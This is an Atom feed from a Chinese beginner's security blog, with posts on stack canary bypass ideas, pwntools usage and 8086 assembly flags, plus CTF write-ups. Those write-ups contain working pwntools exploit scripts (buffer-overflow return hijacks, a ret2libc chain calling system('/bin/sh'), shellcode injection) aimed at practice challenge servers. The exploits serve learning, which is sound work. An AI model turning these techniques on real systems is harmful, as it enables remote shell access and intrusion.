<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>nocbtm&#39;s Blog</title>
  
  <subtitle>xixi</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-10-28T11:56:59.398Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Nocbtm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>stack canary绕过思路</title>
    <link href="http://yoursite.com/2018/10/24/stack-canary%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/"/>
    <id>http://yoursite.com/2018/10/24/stack-canary绕过思路/</id>
    <published>2018-10-24T10:59:43.000Z</published>
    <updated>2018-10-28T11:56:59.398Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-canary保护机制"><a href="#0x00-canary保护机制" class="headerlink" title="0x00 canary保护机制"></a>0x00 canary保护机制</h2><p>我们知道，通常栈溢出的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖ebp、eip等，从而达到劫持控制流的目的。然而stack canary这一技术的应用使得这种利用手段变得难以实现。</p><p>canary保护机制是在栈保护上则是在初始化一个栈帧时在栈底设置一个随机的canary值（最后两位必须是00），栈帧销毁前测试该值是否“死掉”，即是否被改变，若被改变则说明栈溢出发生，程序走另一个流程结束，以免漏洞利用成功。</p><p>如图var-c就是canary的地址，如果触发了栈溢出漏洞，还不知道canary的值，就会执行__stack_chk_fail函数。<br><img src="https://i.imgur.com/0XkugWG.png" alt=""><br><img src="https://i.imgur.com/iXZEDP4.png" alt=""></p><h2 id="0x01-泄露canary"><a href="#0x01-泄露canary" class="headerlink" title="0x01 泄露canary"></a>0x01 泄露canary</h2><p>泄露canary的方法有：</p><ul><li>通过格式化字符串漏洞来泄露canary的值</li><li>通过栈溢出漏洞来泄露canary的值</li><li>多进程程序的canary爆破</li><li>利用__stack_chk_fail函数泄露信息<br>当然具体问题还要具体分析</li></ul><p>未完待续。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-canary保护机制&quot;&gt;&lt;a href=&quot;#0x00-canary保护机制&quot; class=&quot;headerlink&quot; title=&quot;0x00 canary保护机制&quot;&gt;&lt;/a&gt;0x00 canary保护机制&lt;/h2&gt;&lt;p&gt;我们知道，通常栈溢出的利用方式是通过
      
    
    </summary>
    
    
      <category term="ctf pwn" scheme="http://yoursite.com/tags/ctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>萌新赛</title>
    <link href="http://yoursite.com/2018/10/13/%E4%B8%AD%E5%B7%A5%E8%90%8C%E6%96%B0%E8%B5%9B/"/>
    <id>http://yoursite.com/2018/10/13/中工萌新赛/</id>
    <published>2018-10-13T12:09:51.000Z</published>
    <updated>2018-10-28T11:46:25.054Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><p><img src="https://i.imgur.com/WzpekXu.png" alt=""></p><p>下载文件之后拖到IDA里看下，发现callsystem函数，那就简单了<br><img src="https://i.imgur.com/3grH6cf.png" alt=""><br>主函数如下<br><img src="https://i.imgur.com/E7nmQQI.png" alt=""></p><p><img src="https://i.imgur.com/McekReV.png" alt=""></p><p>callsystem地址：<img src="https://i.imgur.com/gG0wskF.png" alt=""></p><p>写出脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">s_addr=0x400596</span><br><span class="line"></span><br><span class="line">p=remote(&quot;120.79.51.146&quot;,10000)</span><br><span class="line"></span><br><span class="line">p.sendline(&apos;a&apos;*0x80+&apos;a&apos;*8+p64(s_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p><img src="https://i.imgur.com/hVFw4y1.png" alt=""></p><p>拖到IDA没有（/bin/sh),也没有system函数，文件中给出了libc库，那就用吧<br>脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line">p=remote(&quot;120.79.51.146&quot;,10002)</span><br><span class="line"></span><br><span class="line">elf=ELF(&quot;rop32&quot;)</span><br><span class="line">main_addr=0x08048460</span><br><span class="line">plt_write=elf.plt[&quot;write&quot;]</span><br><span class="line"></span><br><span class="line">payload = &quot;A&quot; * 0x88 + &quot;A&quot; * 4 + p32(plt_write) + p32(main_addr) + p32(1) + p32(elf.got[&quot;write&quot;]) + p32(4)</span><br><span class="line">p.send(payload)</span><br><span class="line">write_addr=u32(p.recv(4))</span><br><span class="line"></span><br><span class="line">print &quot;write_addr=&quot;+hex(write_addr)</span><br><span class="line"></span><br><span class="line">libc=ELF(&quot;libc6.so&quot;)</span><br><span class="line"></span><br><span class="line">libc_system=libc.symbols[&quot;system&quot;]</span><br><span class="line">libc_binsh=next(libc.search(&quot;/bin/sh&quot;))</span><br><span class="line">libc_write=libc.symbols[&quot;write&quot;]</span><br><span class="line">system_addr=write_addr-libc_write+libc_system</span><br><span class="line">binsh_addr=write_addr-libc_write+libc_binsh</span><br><span class="line">print &quot;system_addr=&quot;+hex(system_addr)</span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line">payload = &quot;A&quot; * 0x88 + &quot;A&quot; * 4 + p32(system_addr) + p32(0x77) + p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;第一题&quot;&gt;&lt;a href=&quot;#第一题&quot; class=&quot;headerlink&quot; title=&quot;第一题&quot;&gt;&lt;/a&gt;第一题&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/WzpekXu.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;下载文件之后拖到
      
    
    </summary>
    
    
      <category term="ctf" scheme="http://yoursite.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>oj level0和level1总结</title>
    <link href="http://yoursite.com/2018/09/21/oj-level0%E5%92%8Clevel1%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2018/09/21/oj-level0和level1总结/</id>
    <published>2018-09-21T11:42:51.000Z</published>
    <updated>2018-09-21T13:29:34.872Z</updated>
    
    <content type="html"><![CDATA[<p><strong>仅献给刚入门的菜鸟，大佬请绕过</strong></p><p>做题之前，需要知道pwntools的基本用法，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch = &apos;i386&apos;, os = &apos;linux&apos;)   ;设置目标机的信息</span><br><span class="line"></span><br><span class="line">r = remote(&apos;exploitme.example.com&apos;, 31337)  ;用来建立一个远程连接，url或者ip作为地址</span><br><span class="line">                                  然后指明端口,这里也可以仅仅使用本地文件,调试时方便:</span><br><span class="line"></span><br><span class="line">r.send(asm(shellcraft.sh()))       ;r.send()将shellcode发送到远程连接</span><br><span class="line"></span><br><span class="line">r.interactive()                    ;将控制权交给用户，这样就可以使用打开的shell了</span><br></pre></td></tr></table></figure></p><p>ps：具体的可以看我的另一篇博客</p><p>还需要知道pwn的一般套路，这里我只说说栈溢出的基本套路：</p><ul><li>找到栈溢出地址（就是搞事情的地址），基本上都是buf的地址，这个地址需要用pwntools中的p32或p64进行转换，（若程序是32位的就用p32）才能用pwntools中的sendline发送到远程连接</li><li>构建shellcode，用一句话就行shellcode = asm(shellcraft.sh())</li><li>构建payload，payload的基本构建：payload=shellcode+’a’*一个长度+p32(buf_addr)，次序一定不能乱</li><li>最后就可以发送payload，进行交互，得到shell的控制权，然后ls ，cat flag<img src="https://i.imgur.com/rCwB8hx.png" alt=""></li></ul><h2 id="level0的脚本如下："><a href="#level0的脚本如下：" class="headerlink" title="level0的脚本如下："></a>level0的脚本如下：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">s_addr=0x400596</span><br><span class="line">r=remote(&quot;pwn2.jarvisoj.com&quot;,9881)</span><br><span class="line"></span><br><span class="line">p.sendline(&apos;a&apos;*0x80+&apos;a&apos;*8+p64(s_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>解释如下：<br>level0是最简单的也是最基本的，这个题有一个函数callsystem，直接返回一个system（”/bin/sh”)也就是返回一个命令框，这就是我们想要的，所以不用构建shellcode和paload了<br><img src="https://i.imgur.com/XZRbADf.png" alt=""><br>脚本里的’a’<em>0x80+’a’</em>8代表的是如下图的两个数据，0x80是申请的总共地址，而8在buf的最下方<img src="https://i.imgur.com/tHfJ9kZ.png" alt=""><br><img src="https://i.imgur.com/HRyGj3Z.png" alt=""></p><p>s_addr=0x400596代表的是函数callsystem的地址<img src="https://i.imgur.com/DDtBv0g.png" alt=""></p><h2 id="level1的脚本如下："><a href="#level1的脚本如下：" class="headerlink" title="level1的脚本如下："></a>level1的脚本如下：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level = &apos;debug&apos;, arch = &apos;i386&apos;, os = &apos;linux&apos;)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io = remote(&apos;pwn2.jarvisoj.com&apos;, 9877)</span><br><span class="line">text = io.recvline()[14: -2]</span><br><span class="line"></span><br><span class="line">buf_addr = int(text, 16)</span><br><span class="line"></span><br><span class="line">payload = shellcode + &apos;a&apos; * (0x88 + 0x4 - len(shellcode)) + p32(buf_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><p>解释如下：<br>这里我只解释主要思路不明白如下两句话的可以百度<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context(log_level = &apos;debug&apos;, arch = &apos;i386&apos;, os = &apos;linux&apos;)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure></p><p>[14:-2]只是python里面的一个切片，代表”What’sthis:0xffee6c50?”<br>这句话取第14个到倒数第二个字符<br>这里的text为buf的地址，只不过是字符型的，需要int（text，16）用16进制的方法转化为int型<img src="https://i.imgur.com/Em3IM1T.png" alt=""></p><p>相比level0，这里多加了一个shellcode，和多减了一个len（shellcode）,shellcode和p32（buf_addr)的值如下图<img src="https://i.imgur.com/2BlLJCp.png" alt=""><br>然后就需要慢慢理解了，为什么这么操作<br>很多时候我们都只是知道怎么去做，但不知道为什么这样做，等以后我懂原理了，在补上解释吧。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;仅献给刚入门的菜鸟，大佬请绕过&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;做题之前，需要知道pwntools的基本用法，如下：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;
      
    
    </summary>
    
    
      <category term="ctf pwn" scheme="http://yoursite.com/tags/ctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwntools</title>
    <link href="http://yoursite.com/2018/09/19/pwntools/"/>
    <id>http://yoursite.com/2018/09/19/pwntools/</id>
    <published>2018-09-19T13:32:24.000Z</published>
    <updated>2018-09-25T10:32:32.462Z</updated>
    
    <content type="html"><![CDATA[<h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><p>pwntools是一个ctf框架和漏洞利用开发库，用python开发，旨在让使用者简单快速的编写exploit。<br>python2安装方法： sudo pip install pwntools<br>python3安装方法： sudo pip3 install pwntools</p><h2 id="IO模块"><a href="#IO模块" class="headerlink" title="IO模块"></a>IO模块</h2><p>下面给出了PwnTools中的主要IO函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">send(data) : 发送数据</span><br><span class="line">sendline(data) : 发送一行数据，相当于在末尾加\n</span><br><span class="line"></span><br><span class="line">recv(numb=4096, timeout=default) : 给出接收字节数,timeout指定超时</span><br><span class="line">recvuntil(delims, drop=False) : 接收到delims的pattern</span><br><span class="line">（以下可以看作until的特例）</span><br><span class="line">recvline(keepends=True) : 接收到\n，keepends指定保留\n</span><br><span class="line">recvall() : 接收到EOF</span><br><span class="line">recvrepeat(timeout=default) : 接收到EOF或timeout</span><br><span class="line"></span><br><span class="line">interactive() : 与shell交互</span><br></pre></td></tr></table></figure></p><h2 id="ELF模块"><a href="#ELF模块" class="headerlink" title="ELF模块"></a>ELF模块</h2><p>ELF模块用于获取ELF文件的信息，首先使用ELF()获取这个文件的句柄，然后使用这个句柄调用函数，和IO模块很相似。</p><p>下面演示了：获取基地址、获取函数地址（基于符号）、获取函数got地址、获取函数plt地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; e = ELF(&apos;/bin/cat&apos;)</span><br><span class="line">&gt;&gt;&gt; print hex(e.address)  # 文件装载的基地址</span><br><span class="line">0x400000</span><br><span class="line">&gt;&gt;&gt; print hex(e.symbols[&apos;write&apos;]) # 函数地址</span><br><span class="line">0x401680</span><br><span class="line">&gt;&gt;&gt; print hex(e.got[&apos;write&apos;]) # GOT表的地址</span><br><span class="line">0x60b070</span><br><span class="line">&gt;&gt;&gt; print hex(e.plt[&apos;write&apos;]) # PLT的地址</span><br><span class="line">0x401680</span><br></pre></td></tr></table></figure></p><h2 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h2><p>主要是对整数进行打包，就是转换成二进制的形式，比如转换成地址。p32、p64是打包，u32、u64是解包。<br>数据打包,即将整数值转换为32位或者64位地址一样的表示方式,比如0x400010表示为\x10\x00\x40一样,这使得我们构造payload变得很方便</p><p>用法: </p><ul><li>p32/p64: 打包一个整数,分别打包为32或64位 </li><li>u32/u64: 解包一个字符串,得到整数</li></ul><h2 id="大致框架"><a href="#大致框架" class="headerlink" title="大致框架"></a>大致框架</h2><p>官网的一个简单样例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch = &apos;i386&apos;, os = &apos;linux&apos;)   ;设置目标机的信息</span><br><span class="line"></span><br><span class="line">r = remote(&apos;exploitme.example.com&apos;, 31337)  ;用来建立一个远程连接，url或者ip作为地址</span><br><span class="line">                                  然后指明端口,这里也可以仅仅使用本地文件,调试时方便:</span><br><span class="line"></span><br><span class="line">r.send(asm(shellcraft.sh()))       ;r.send()将shellcode发送到远程连接</span><br><span class="line"></span><br><span class="line">r.interactive()                    ;将控制权交给用户，这样就可以使用打开的shell了</span><br></pre></td></tr></table></figure><h2 id="Context设置"><a href="#Context设置" class="headerlink" title="Context设置"></a>Context设置</h2><p>context是pwntools用来设置环境的功能。在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题。</p><p>一般来说我们设置context只需要简单的一句话:</p><p>context(os=’linux’, arch=’amd64’, log_level=’debug’)</p><p>这句话的意思是： </p><ol><li>os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux </li><li>arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’ </li><li>log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和IO相关的错误。</li></ol><h2 id="汇编与shellcode"><a href="#汇编与shellcode" class="headerlink" title="汇编与shellcode"></a>汇编与shellcode</h2><p>有的时候我们需要在写exp的时候用到简单的shellcode，pwntools提供了对简单的shellcode的支持。<br>首先，常用的，也是最简单的shellcode，即调用/bin/sh可以通过shellcraft得到：</p><p>注意，由于各个平台，特别是32位和64位的shellcode不一样，所以最好先设置context。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(shellcraft.sh()) # 打印出shellcode</span><br></pre></td></tr></table></figure></p><p>不过，现在我们看到的shellcode还是汇编代码，不是能用的机器码，所以还需要进行一次汇编<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(asm(shellcraft.sh())) # 打印出汇编后的shellcode</span><br></pre></td></tr></table></figure></p><p>asm可以对汇编代码进行汇编，不过pwntools目前的asm实现还有一些缺陷，比如不能支持相对跳转等等，只可以进行简单的汇编操作。如果需要更复杂一些的汇编功能，可以使用keystone-engine项目，这里就不再赘述了。</p><p>asm也是架构相关，所以一定要先设置context，避免一些意想不到的错误。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;pwntools&quot;&gt;&lt;a href=&quot;#pwntools&quot; class=&quot;headerlink&quot; title=&quot;pwntools&quot;&gt;&lt;/a&gt;pwntools&lt;/h2&gt;&lt;p&gt;pwntools是一个ctf框架和漏洞利用开发库，用python开发，旨在让使用者简单快速的
      
    
    </summary>
    
    
      <category term="ctf pwn" scheme="http://yoursite.com/tags/ctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>cmp指令 </title>
    <link href="http://yoursite.com/2018/09/16/cmp%E6%8C%87%E4%BB%A4/"/>
    <id>http://yoursite.com/2018/09/16/cmp指令/</id>
    <published>2018-09-16T08:16:31.000Z</published>
    <updated>2018-09-16T08:54:02.352Z</updated>
    
    <content type="html"><![CDATA[<p>cmp是比较指令，cmp的功能相当于减法指令，只是不保存结果。<br>cmp指令格式：cmp操作对象1，操作对象2<br>功能：计算操作对象1-操作对象2但不保存结果，仅仅根据计算结果对标志寄存器进行设置。</p><p>指令cmp ax，bx的逻辑含义是比较ax，bx中的值，如果执行后：<br>zf=1，说明(ax)=(bx)<br>zf=0，说明（ax）不等于（bx）<br>cf=1，说明（ax）&lt;(bx)<br>cf=0，说明（ax)&gt;=(bx)<br>cf=0且zf=0，说明（ax）&gt;(bx)<br>cf=1或zf=1,说明(ax)&lt;=(bx）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;cmp是比较指令，cmp的功能相当于减法指令，只是不保存结果。&lt;br&gt;cmp指令格式：cmp操作对象1，操作对象2&lt;br&gt;功能：计算操作对象1-操作对象2但不保存结果，仅仅根据计算结果对标志寄存器进行设置。&lt;/p&gt;
&lt;p&gt;指令cmp ax，bx的逻辑含义是比较ax，bx中的
      
    
    </summary>
    
    
      <category term="汇编语言" scheme="http://yoursite.com/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>sbb指令 </title>
    <link href="http://yoursite.com/2018/09/16/sbb%E6%8C%87%E4%BB%A4/"/>
    <id>http://yoursite.com/2018/09/16/sbb指令/</id>
    <published>2018-09-16T08:16:16.000Z</published>
    <updated>2018-09-16T08:26:17.749Z</updated>
    
    <content type="html"><![CDATA[<p>sbb是带减法指令，它利于了CF位上记录的错位置。<br>指令格式：sbb 操作对象1，操作对象2<br>功能：操作对象1=操作对象1-操作对象2-CF<br>例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov bx,1000H</span><br><span class="line">mov ax,003EH</span><br><span class="line">sub bx,2000H</span><br><span class="line">sbb ax,0020H</span><br></pre></td></tr></table></figure></p><p>sbb指令执行后，将对CF进行设置。利用sbb指令可以对任意大的数据进行减法运算。上面程序，就是计算003E1000H-00202000H</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;sbb是带减法指令，它利于了CF位上记录的错位置。&lt;br&gt;指令格式：sbb 操作对象1，操作对象2&lt;br&gt;功能：操作对象1=操作对象1-操作对象2-CF&lt;br&gt;例如：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cla
      
    
    </summary>
    
    
      <category term="汇编语言" scheme="http://yoursite.com/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>adc指令 </title>
    <link href="http://yoursite.com/2018/09/16/adc%E6%8C%87%E4%BB%A4/"/>
    <id>http://yoursite.com/2018/09/16/adc指令/</id>
    <published>2018-09-16T06:52:54.000Z</published>
    <updated>2018-09-16T08:53:59.773Z</updated>
    
    <content type="html"><![CDATA[<p>adc是带进位加法指令<br>指令格式：adc 操作对象1，操作对象2<br>功能：操作对象1=操作对象1+操作对象2+CF</p><p>例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,2</span><br><span class="line">mov bx,1</span><br><span class="line">sub bx,ax</span><br><span class="line">adc ax,1</span><br></pre></td></tr></table></figure></p><p>执行后，（ax）=4,abc执行时想，相当于计算：（ax）+1+CF=2+1+1=4<br>adc指令的目的，就是来进行假发的第二步运算的。adc指令和add指令相配合就可以对更大的数据进行加法运算。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;adc是带进位加法指令&lt;br&gt;指令格式：adc 操作对象1，操作对象2&lt;br&gt;功能：操作对象1=操作对象1+操作对象2+CF&lt;/p&gt;
&lt;p&gt;例如：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter
      
    
    </summary>
    
    
      <category term="汇编语言" scheme="http://yoursite.com/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>检测点11.1 </title>
    <link href="http://yoursite.com/2018/09/16/%E6%A3%80%E6%B5%8B%E7%82%B911-1/"/>
    <id>http://yoursite.com/2018/09/16/检测点11-1/</id>
    <published>2018-09-16T06:29:30.000Z</published>
    <updated>2018-09-16T06:51:06.208Z</updated>
    
    <content type="html"><![CDATA[<p>写出下面每条指令执行后，ZF、PF、SF、等标志位的值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sub al,al     al=0h        ZF=1        PF=1        SF=0 </span><br><span class="line"></span><br><span class="line">mov al,1      al=1h        ZF=1        PF=1        SF=0 </span><br><span class="line"></span><br><span class="line">push ax       ax=1h        ZF=1        PF=1        SF=0 </span><br><span class="line"></span><br><span class="line">pop bx        bx=1h        ZF=1        PF=1        SF=0 </span><br><span class="line"></span><br><span class="line">add al,bl     al=2h        ZF=0        PF=0        SF=0 </span><br><span class="line"></span><br><span class="line">add al,10     al=12h       ZF=0        PF=1        SF=0 </span><br><span class="line"></span><br><span class="line">mul al        ax=144h      ZF=0        PF=1        SF=0</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;写出下面每条指令执行后，ZF、PF、SF、等标志位的值。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span c
      
    
    </summary>
    
    
      <category term="汇编语言" scheme="http://yoursite.com/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>标志寄存器 </title>
    <link href="http://yoursite.com/2018/09/16/%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8/"/>
    <id>http://yoursite.com/2018/09/16/标志寄存器/</id>
    <published>2018-09-16T03:55:49.000Z</published>
    <updated>2018-09-16T08:53:51.172Z</updated>
    
    <content type="html"><![CDATA[<p>标志寄存器（简称flag）的作用：<br>（1）用来存储相关指令的某些执行结果。<br>（2）用来为CPU执行相关指令提供行为依据。<br>（3）用来控制CPU的相关工作方式。<br>flag和其他寄存器不一样，其他寄存器是用来存放数据的，都是整个寄存器具有一个含义。而flag寄存器死按位起作用的，它的每一位都有专门的含义，记录特定的信息。<img src="https://i.imgur.com/p2T0oAQ.png" alt=""></p><p>flag的1,3,5,12,13,14,15位在8086CPU中没有使用，不具有任何含义</p><h2 id="ZF标志"><a href="#ZF标志" class="headerlink" title="ZF标志"></a>ZF标志</h2><p>flag的第六位是ZF，零标志位。它记录相关指令执行后，其结果是否为0.如果结果为0，那么zf=1，如果结果不为0，那么zf=0</p><p>例如指令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">sub ax,1</span><br></pre></td></tr></table></figure></p><p>执行后，结果为0，则zf=1</p><h2 id="PF标志"><a href="#PF标志" class="headerlink" title="PF标志"></a>PF标志</h2><p>flag的第二位是PF，奇偶标志位，它记录相关指令执行后，其结果的所有bit位中1的个数是否位偶数。如果1的个数为偶数，pf=1，如果为奇数，那么pf=0<br>比如指令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">add al,10</span><br></pre></td></tr></table></figure></p><p>执行后，结果为00001011B，其中有3个1，则pf=0</p><h2 id="SF标志"><a href="#SF标志" class="headerlink" title="SF标志"></a>SF标志</h2><p>flag的第七位是SF，符号标志位，它记录相关指令后，其结果是否为负。如果结果为负，sf=1，如果不为负，sf=0<br>计算机通常用补码来表示有符号数据。计算机的UI个数据可以看做是由富豪书，也可以看做成无符号数。比如：<br>00000001B，可以看做无符号数1，或有符号数+1；<br>10000001B，可以看做无符号数129，也可以看作有符号数-127<br>不管我们如何看待，CPU在执行add等指令的时候，就已经包含了两种含义，也将得到同一种信息来记录的两种结果。关键在于我们的程序需要哪一种结果。<br>比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,10000001B</span><br><span class="line">add al,1</span><br></pre></td></tr></table></figure></p><p>执行后，结果为10000010B，sf=1，表示：如果指令进行的是有符号数运算，那么结果为负；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,100000001B</span><br><span class="line">add al,011111111B</span><br></pre></td></tr></table></figure></p><p>执行后，结果为0，sf=0，表示：如果指令进行的是有符号数运算，那么结果为非负。<br>某些指令将影响寄存器中的多个标记为，这些被影响的标记位比较全面地记录了指令的执行结果，为相关的处理提供了所需的依据。比如指令sub，al，al执行后，ZF、PF、SF等标志位都要受到影响，它们分别为：1,1,0。</p><h2 id="CF标志位"><a href="#CF标志位" class="headerlink" title="CF标志位"></a>CF标志位</h2><p>flag的第0位是CF，进位标志位，一般情况下，在进行无符号运算的时候，它记录了运算结果的最高有效位向更高位的进位值，或从更高位的借位值。<br>比如，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 